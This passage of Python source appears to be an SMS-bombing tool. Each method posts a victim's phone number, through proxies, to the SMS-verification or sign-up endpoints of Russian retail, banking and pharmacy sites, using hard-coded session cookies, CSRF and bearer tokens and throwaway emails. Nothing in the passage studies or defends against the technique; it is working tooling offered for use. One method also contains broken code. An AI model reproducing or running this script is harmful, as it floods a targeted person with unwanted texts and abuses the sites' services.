            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://sephora.ru/',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        data = {
          's_login': self.phone_not_pluse[1:],
          'm_mail': f'a{radnom.radnint(1,99999)}@mail.ru',
          's_pass': f'{radnom.radnint(1,99999)}',
          'b_accept_privacy_policy': '1',
          'submit_register': '1',
          's_action': 'code_confirm_send'
        }

        response = requests.post('https://sephora.ru/', headers=headers, cookies=cookies, data=data, proxies=proxies)

    def bankiru(self,proxies):
        cookies = {
        '_ym_uid': '1608379933371531271',
        '_ym_d': '1608379933',
        'PHPSESSID': '8589e3960cdc6c34a2d64b8c3fac3bb2',
        'BANKI_RU_USER_IDENTITY_UID': '4158207822689974314',
        'aff_sub3': 'main',
        '_flpt_main_page_refinance': 'main_page_refinance_yes',
        'X-PASSPORT-NEW-AUTH': 'true',
        '_gcl_au': '1.1.352756440.1615215832',
        'ga_client_id': '589881135.1615215832',
        '_fbp': 'fb.1.1615215834015.1157200729',
        'banki_prev_page': '/',
        '_flpt_new_geo_functional': 'geo_new',
        '_flpt_mortgage_iframe_btn': 'iframe_no',
        '_flpt_mpk_estate_steps': 'mpk_estate_steps_no',
        '_flpt_main_page_mortgage': 'main_page_mortgage_no',
        '_gid': 'GA1.2.2135983553.1616326135',
        '_gat': '1',
        'counter_session': '1',
        '_ga': 'GA1.1.589881135.1615215832',
        '_ym_visorc': 'b',
        '_ym_isad': '1',
        'user_region_id': '9362',
        '_ga_MEEKHDWY53': 'GS1.1.1616326136.3.1.1616326155.41',
        }

        headers = {
            'Connection': 'keep-alive',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'Accept': '*/*',
            'Origin': 'https://www.banki.ru',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://www.banki.ru/',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        data = {
          'registration[phone]': f'+{self.phone_not_pluse}',
          'registration[_token]': 'yeKnz6Ksj41VRvfrnrgZUR2OFZ_l6rYeDJFJYkYOkEE'
        }

        response = requests.post('https://www.banki.ru/ng-auth/send-code', headers=headers, cookies=cookies, data=data, proxies=proxies)


    def auchan(self,proxies):
        cookies = {
        'isAddressPopupShown_': 'true',
        'region_id': '9',
        'rrpvid': '874423120805119',
        '_GASHOP': '729_Simferopol',
        'methodDelivery_': '1',
        '_gcl_au': '1.1.1319080429.1616278874',
        'rcuid': '5fe8a97d08718b000115e393',
        '_ym_uid': '16162788781041835772',
        '_ym_d': '1616278878',
        '_gid': 'GA1.2.438049857.1616278878',
        'mindboxDeviceUUID': 'fc9b81f4-1e69-4e96-bd85-bb32c0aea013',
        'directCrm-session': '%7B%22deviceGuid%22%3A%22fc9b81f4-1e69-4e96-bd85-bb32c0aea013%22%7D',
        '_fbp': 'fb.1.1616278880408.715959506',
        '_clck': '1ox9yio',
        'device_id': '535430852443.588',
        '_ym_isad': '1',
        'acceptCookies_': 'true',
        'SERVERID': 'web-4',
        'merchant_ID_': '729',
        '_ga_6KC2J1XGF1': 'GS1.1.1616326545.2.0.1616326545.60',
        '_ga': 'GA1.2.115099898.1616278878',
        '_dc_gtm_UA-49770337-2': '1',
        '_dc_gtm_UA-112545724-4': '1',
        '_gat_UA-112545724-4': '1',
        '_gat_UA-49770337-2': '1',
        }

        headers = {
            'authority': 'www.auchan.ru',
            'x-newrelic-id': 'VgACUV5XDBADUlhXAQAHUw==',
            'tracestate': '2650844@nr=0-1-2650844-36956222-b9f00d0ffe907acc----1616326576568',
            'traceparent': '00-d523eb78f6adc4fa0ed2d93c33b12820-b9f00d0ffe907acc-01',
            'source': '4',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI2NTA4NDQiLCJhcCI6IjM2OTU2MjIyIiwiaWQiOiJiOWYwMGQwZmZlOTA3YWNjIiwidHIiOiJkNTIzZWI3OGY2YWRjNGZhMGVkMmQ5M2MzM2IxMjgyMCIsInRpIjoxNjE2MzI2NTc2NTY4fX0=',
            'accept': 'application/json, text/plain, */*',
            'access_token': 'eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI2OTZjMWI5Zi0xZzQ1LTQ1OWEtYmVhNC0xMTEwNjhmYWNkYTgiLCJpYXQiOjE2MTYzMjY2MjYsInN1YiI6ImNoZWNrbWFpbF91c2VyIiwibGV2ZWwiOjIwLCJpc3MiOiJBdWNoYW4ucnUiLCJleHAiOjE2MjAzMjY2MjZ9.2SsO2PYBrVvSrpCz3izMBmLmFH3RB1YJLfGasgQuHdg',
            'phone': self.phone_not_pluse,
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.auchan.ru/auth/',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        response = requests.get('https://www.auchan.ru/v1/cmd/clientprofile/checkphone', headers=headers, cookies=cookies, proxies=proxies)


    def mainpoint(self,proxies):
        headers = {
        'authority': 'n13519.yclients.com',
        'accept': 'application/json, text/plain, */*',
        'x-requested-with': 'XMLHttpRequest',
        'accept-language': 'ru-RU',
        'authorization': 'Bearer yusw3yeu6hrr4r9j3gw6',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
        'content-type': 'application/json',
        'origin': 'https://n13519.yclients.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://n13519.yclients.com/company:32366/fullscreen-menu-login/code',
        'cookie': '_ym_uid=1616326835560271226; _ym_d=1616326835; _ym_visorc=w; _ym_isad=1',
        }

        data = '{"phone":"uryn"}'.replace('uryn',self.phone_not_pluse)

        response = requests.post('https://n13519.yclients.com/api/v1/book_code/32366', headers=headers, data=data, proxies=proxies)

    def cupis(self,proxies):
        amm = phone_mask(self.phone_not_pluse, '+# (###) ### ## ##')
        cookies = {
        'CUPIS-SESSION-ID': 'c4ebbd01-6766-4acf-9eba-d5baadd8254f',
        '_ga': 'GA1.2.1871337332.1616327223',
        '_gid': 'GA1.2.1891434052.1616327223',
        '_ym_uid': '161632722315111534',
        '_ym_d': '1616327223',
        '_ym_visorc': 'w',
        '_ym_isad': '1',
        '_fbp': 'fb.1.1616327224305.732401229',
        }

        headers = {
            'Connection': 'keep-alive',
            'accept': 'application/json',
            'x-csrf-token': '8a06dc9c-aa84-4643-855b-fe756ce74fd4',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'content-type': 'application/json',
            'Origin': 'https://1cupis.ru',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://1cupis.ru/signup',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        data = '{"phone":"uryn","email":"fsdfdsfs@mail.ru","password":"1234sad;kjfaFDSKJ","confirm":"on"}'.replace('uryn',amm)

        response = requests.post('https://1cupis.ru/doSendSms', headers=headers, cookies=cookies, data=data)

    def bapteka(self,proxies):
        headers = {
        'authority': 'b-apteka.ru',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
        'x-requested-with': 'XMLHttpRequest',
        'content-type': 'application/json',
        'accept': '*/*',
        'origin': 'https://b-apteka.ru',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://b-apteka.ru/lk/login',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cookie': 'bap_referer=eyJpdiI6IkhxZ3VBTU9VN2Jhb09TdHJDNms0ZWc9PSIsInZhbHVlIjoicUJLMWF3TGFOOXV0ZWxYUG1aXC83M29BRGVwaGx3blBidTZhNTgrdnhhWHc9IiwibWFjIjoiMjM4YmQ5OWMzMGJmYmZkMzEwZTE2ZGIyYzAxMjEzYjA5ODNkNTRiODBkODVhNDNhOTI0MjZlZGZlZjE5NTBkYSJ9; city=izhevsk; _gid=GA1.2.1671774297.1616327586; _ym_uid=1616327586790809943; _ym_d=1616327586; _ym_visorc=w; _gat_UA-91373350-1=1; _fbp=fb.1.1616327588107.1787496964; _ym_isad=1; main_banner_is_show_106=1; XSRF-TOKEN=eyJpdiI6IlA3a0tGT1BPdU5HTnY2MFdcL0dYUjB3PT0iLCJ2YWx1ZSI6IlwvaCs3QWdPVmtSbkVpVjlidlNiVzN1R0dab0lWOFlLNUxVcm5sbG1qb005cW51T1wvbFNjc1AyTW9taURnd1g4RmdcL2ZsdGRyOGFnM2VnaVhNR3VIbnNRPT0iLCJtYWMiOiIxYWY5YjFiNmIyN2YxMDg1NDU2N2QyMWI3MjQ5NDZmYzA5NDExOTE3YzA3NTViMDIyZjg5ODAyYzMzMGFiYjc0In0%3D; b-apteka_session=eyJpdiI6InloSGNvRXFESUNIR25NczRmS08rMHc9PSIsInZhbHVlIjoidG5SNzRrUW51OFQxcURwM2RaYWF4dG9LSkZSU0hkY0ZqMEZQVU4xeUtjZW9HQitMdlg1XC85akUyXC9nR1RSRm5UVWJmTWRqN2tsd0tmK3pQM1o1alFFZz09IiwibWFjIjoiNDIyNzRmNjliNjNhY2I4OTg1Njg2NDIyMDA5NzMxMDg3ZjRkNTI5M2NkNjk5MTJkZDFlYTVkNmEyOThiYjNmYSJ9; _ga=GA1.1.660791552.1616327586; _ga_R0BMF1SYPV=GS1.1.1616327585.1.1.1616327596.0',
        }

        data = '{"phone":"uryn"}'.replace('uryn',self.phone_not_pluse)

        response = requests.post('https://b-apteka.ru/lk/send_confirm_code', headers=headers, data=data, proxies=proxies)

    def cmd(self,proxies):
        headers = {
            'authority': 'www.cmd-online.ru',
            'accept': '*/*',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.cmd-online.ru',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.cmd-online.ru/kabinet/login/',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': 'PHPSESSID=X99RC7eGqxmDfl2O3B98ywHGp206ylNg; BITRIX_SM_PK=page; BITRIX_SM_GUEST_ID=3157130; bxmaker.geoip.2.8.1_s1_location=0; bxmaker.geoip.2.8.1_s1_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; bxmaker.geoip.2.8.1_s1_city_id=0; bxmaker.geoip.2.8.1_s1_country_id=0; bxmaker.geoip.2.8.1_s1_region_id=0; bxmaker.geoip.2.8.1_s1_range=0; bxmaker.geoip.2.8.1_s1_lat=0; bxmaker.geoip.2.8.1_s1_lng=0; bxmaker.geoip.2.8.1_s1_yandex=1; BITRIX_SM_BANNERS=1_29_1_28032021%2C1_30_1_28032021; URL_BACK=%2Fanalizy-i-tseny%2Fkatalog-analizov%2F; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A37%2C%22EXPIRE%22%3A1616360340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; BITRIX_SM_GUEST_ID=3157130; BITRIX_SM_LAST_VISIT=21.03.2021+15%3A04%3A23; _gcl_au=1.1.1899064730.1616328243; _gid=GA1.2.1569786792.1616328243; _ym_uid=1616328244989062804; _ym_d=1616328244; BX_USER_ID=471dd1e786051fd65f144165b507a5e2; _ym_visorc=w; _ym_isad=1; _fbp=fb.1.1616328244203.831181633; _ga_YWLBCHDP34=GS1.1.1616328243.1.1.1616328246.0; _ga=GA1.2.2069663511.1616328243; cookieConfirm=cookieConfirmed; BITRIX_SM_LAST_VISIT=21.03.2021+15%3A04%3A55; _gat_UA-4261681-1=1',
        }

        data = {
          'log': f's{random.randint(1,999999)}jf@mail.ru',
          'pass': random.randint(1,99999),
          'name': '\u0414\u043C\u0438\u0442\u0440\u0438\u0439',
          'surname': '\u0414\u043C\u0438\u0442\u0440\u0438\u0439',
          'patr': '\u0414\u043C\u0438\u0442\u0440\u0438\u0439',
          'email': f's{random.randint(1,999999)}jf@mail.ru',
          'gender': 'M',
          'birthday': '1995-01-14',
          'phone_mobile': self.phone_not_pluse[1:],
          'subscribe': 'y',
          'code': ''
        }

        response = requests.post('https://www.cmd-online.ru/local/api/office/lk/personalregister.php', headers=headers, data=data, proxies=proxies)


    def proapteka(self,proxies):
        amm = phone_mask(self.phone_not_pluse, '+# (###) ###-##-##')
        cookies = {
            'PHPSESSID': 'gr5kq6mCOtEC4bvfI70f4KmVT774lODj',
            'BITRIX_SM_MY_LOCATION': '0000073738',
            'BITRIX_SM_SALE_UID': '86224903',
            '_ym_uid': '1616328619296444406',
            '_ym_d': '1616328619',
            '_ym_visorc': 'w',
            '_ym_isad': '1',
            '_ga': 'GA1.2.376203848.1616328620',
            '_gid': 'GA1.2.773343082.1616328620',
            '_dc_gtm_UA-116482572-1': '1',
            '_gat_gtag_UA_122520257_1': '1',
            'BX_USER_ID': '471dd1e786051fd65f144165b507a5e2',
        }

        headers = {
            'Connection': 'keep-alive',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.proapteka.ru',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://www.proapteka.ru/',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        data = {
          'phone': amm,
          'sessid': '26ac4fe202071e4921f7352bbaf0b480'
        }

        response = requests.post('https://www.proapteka.ru/user/get-code/', headers=headers, cookies=cookies, data=data, proxies=proxies)